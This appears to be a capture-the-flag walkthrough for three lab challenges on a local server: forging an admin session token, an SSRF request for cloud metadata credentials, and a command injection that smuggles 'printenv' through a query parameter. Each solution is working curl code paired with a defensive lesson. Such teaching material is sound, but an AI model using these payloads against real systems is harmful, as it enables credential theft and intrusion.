# Walkthroughs — medium tier (SPOILERS)

## session — Forge an admin session

The token is not random; it is `base64url("username:role")`. Forge an admin one:

```bash
TOKEN=$(python3 -c "import base64;print(base64.urlsafe_b64encode(b'admin:admin').decode())")
curl -s http://127.0.0.1:5000/ctf/admin -H "X-Session: $TOKEN"
```

The response JSON contains the flag.

**Lesson:** session identifiers must be random and server-side, carrying no
attacker-controllable meaning.

## ssrf — Reach the metadata service

```bash
curl -s "http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
```

The fetch endpoint does not validate the destination, so it will request the
internal link-local metadata address (`169.254.169.254`) — the classic SSRF
target that exposes instance credentials. The response body is the flag.

**Lesson:** allowlist schemes, resolve the host, and reject private, loopback,
and link-local ranges.

## cmdi — Run a second command

```bash
curl -s "http://127.0.0.1:5000/diag?host=x;%20printenv%20CTF_FLAG"
```

The host value is concatenated into a shell command run with `shell=True`. A
semicolon ends the first command and starts yours; `printenv CTF_FLAG` prints
the flag that lives in the process environment.

**Lesson:** avoid the shell — use an argument list with `shell=False` and
validate input against an allowlist.
